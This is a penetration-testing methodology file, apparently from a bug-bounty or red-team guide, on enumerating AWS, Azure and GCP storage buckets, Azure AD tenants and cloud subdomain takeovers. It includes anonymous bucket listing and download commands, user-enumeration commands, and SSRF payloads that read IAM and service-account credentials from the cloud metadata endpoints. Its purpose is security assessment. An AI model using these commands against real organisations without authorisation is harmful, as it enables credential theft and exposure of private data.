# Cloud Asset Discovery — Deep Dive

Cloud providers host infrastructure outside an organization's own WHOIS/ASN footprint.
S3 buckets, Azure blob containers, and GCS buckets are common targets for misconfiguration,
data exposure, and shadow IT. These assets require dedicated enumeration strategies.

---

## AWS — S3 buckets

### Naming patterns

S3 bucket names are global and predictable. Derive candidates from:
- Organization name: `target`, `target-corp`, `targetcorp`
- Product and project names found during passive recon
- Confirmed subdomain tokens: if `api.target.com` exists, try `target-api`, `api-target`
- Environment suffixes: `-dev`, `-staging`, `-prod`, `-backup`, `-data`, `-logs`, `-assets`
- Combined: `target-prod-logs`, `target-dev-backup`, `targetcorp-assets`

### Tools

```bash
# s3scanner — enumerate S3 bucket existence and permission level
s3scanner scan --bucket target-dev
s3scanner scan --buckets-file bucket_candidates.txt   # batch mode

# Output flags: exists/not-found + read/write/list permissions per bucket
# Interesting finds: AllUsers:READ (public read), AllUsers:WRITE (public write = RCE risk)

# cloud_enum — multi-cloud enumeration (S3, Azure, GCP) from one wordlist
cloud_enum -k target -k targetcorp -k target-prod --disable-azure --disable-gcp

# aws cli — manual verification after discovery
aws s3 ls s3://target-dev --no-sign-request        # anonymous list
aws s3 cp s3://target-dev/sensitive.txt . --no-sign-request  # anonymous download
```

### Passive discovery (no direct contact)

```
# Search GrayhatWarfare for indexed open buckets
https://buckets.grayhatwarfare.com/

# Search for S3 URLs in CT logs and Shodan
# crt.sh JSON output often includes S3-hosted cert subjects
# Shodan: search for S3 bucket FQDNs via SSL cert SAN

# Search for S3 references in JS files (via katana/gau)
grep -oE 's3\.amazonaws\.com/[a-z0-9._-]+' js_endpoints.txt
grep -oE '[a-z0-9._-]+\.s3\.amazonaws\.com' js_endpoints.txt
```

### Metadata endpoint (SSRF pivot)

If you have SSRF on an EC2-hosted target:

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
```

IMDSv2 requires a token (PUT request first), but many instances still run IMDSv1.

---

## Azure — Blob storage and services

### Naming patterns and URL format

Azure blob containers follow: `https://<account>.blob.core.windows.net/<container>/`

Derive account name candidates the same way as S3 (org name, products, environments).
Note: Azure account names are 3–24 lowercase alphanumeric only.

```bash
# cloud_enum — Azure blob + Azure Files + Azure Table storage
cloud_enum -k target -k targetcorp --disable-aws --disable-gcp

# Manual check — anonymous blob listing
curl "https://target.blob.core.windows.net/?comp=list"
curl "https://target.blob.core.windows.net/public/?comp=list&restype=container"
```

### Azure-specific subdomain patterns in CT logs

Watch for these in CT/PDNS results:
- `target.blob.core.windows.net`
- `target.azurewebsites.net` — Azure App Service (often dev/staging)
- `target.azurefd.net` — Azure Front Door CDN
- `target.azurecontainer.io` — Azure Container Instances
- `target.onmicrosoft.com` — Azure AD tenant (enumerate users via `o365creeper`, `AADInternals`)

### Azure AD tenant discovery

```bash
# Check if target uses Azure AD and enumerate tenant
curl "https://login.microsoftonline.com/target.com/.well-known/openid-configuration"
# Response: tenant_id, authorization_endpoint — confirms Azure AD usage

# AADInternals — tenant and user enumeration
Get-AADIntLoginInformation -Domain target.com
Invoke-AADIntUserEnumerationAsOutsider -Domain target.com
```

---

## GCP — Cloud Storage buckets

### Naming patterns and URL format

GCS bucket URL: `https://storage.googleapis.com/<bucket>/`
Also: `https://<bucket>.storage.googleapis.com/`

```bash
# cloud_enum — GCS buckets
cloud_enum -k target -k targetcorp --disable-aws --disable-azure

# Manual check — anonymous bucket listing
curl "https://storage.googleapis.com/<bucket>?prefix=&delimiter=/"
curl "https://storage.googleapis.com/storage/v1/b/<bucket>/o"

# gsutil — anonymous access check
gsutil ls gs://target-bucket
```

### GCP metadata endpoint (SSRF pivot)

From a GCE instance via SSRF:

```
http://metadata.google.internal/computeMetadata/v1/
# Requires header: Metadata-Flavor: Google

http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

---

## Multi-cloud enumeration workflow

```
1. Build candidate list:
   - Org name tokens from WHOIS/passive recon
   - Product/project names from job postings and GitHub
   - Confirmed subdomain tokens (strip .target.com, use base word)
   - Environment suffixes: dev, staging, prod, backup, logs, data, assets, media, files

2. Run cloud_enum across all three providers with candidate list.

3. Separately brute-force S3 with s3scanner for permission details.

4. Check CT logs + JS files for direct bucket URL references.

5. Verify any publicly readable buckets manually — look for:
   - Source code, config files (.env, web.config, app.yaml)
   - Database dumps and exports (.sql, .csv, .json)
   - Private keys and credentials (.pem, .key, .pfx)
   - Internal documentation and org charts

6. Test publicly writable buckets (rare, critical) — AllUsers:WRITE = arbitrary file upload.
```

---

## Cloud subdomain takeover

Cloud-specific subdomain takeover patterns (extend from active-recon.md subdomain takeover section):

| Dangling CNAME target | Service | Takeover method |
|-----------------------|---------|-----------------|
| `*.s3.amazonaws.com` | S3 static hosting | Claim the bucket name |
| `*.azurewebsites.net` | Azure App Service | Register the App Service name |
| `*.cloudapp.net` | Azure VM DNS | Register the cloud service name |
| `*.github.io` | GitHub Pages | Create matching repo |
| `*.netlify.app` | Netlify | Create matching site |
| `*.vercel.app` | Vercel | Create matching project |

Tools: `nuclei -t takeovers/`, `can-i-take-over-xyz` repository for current provider status.

---

## Tooling summary

| Tool | Cloud | Purpose |
|------|-------|---------|
| `cloud_enum` | AWS / Azure / GCP | Multi-cloud bucket enumeration |
| `s3scanner` | AWS | S3 bucket permission testing |
| `GrayhatWarfare` (web) | AWS / Azure / GCP | Search indexed open buckets |
| `AADInternals` | Azure | Azure AD tenant and user enum |
| `nuclei -t takeovers/` | All | Cloud subdomain takeover detection |
| `gsutil` | GCP | Manual GCS bucket access verification |
| `aws cli --no-sign-request` | AWS | Anonymous S3 bucket access verification |
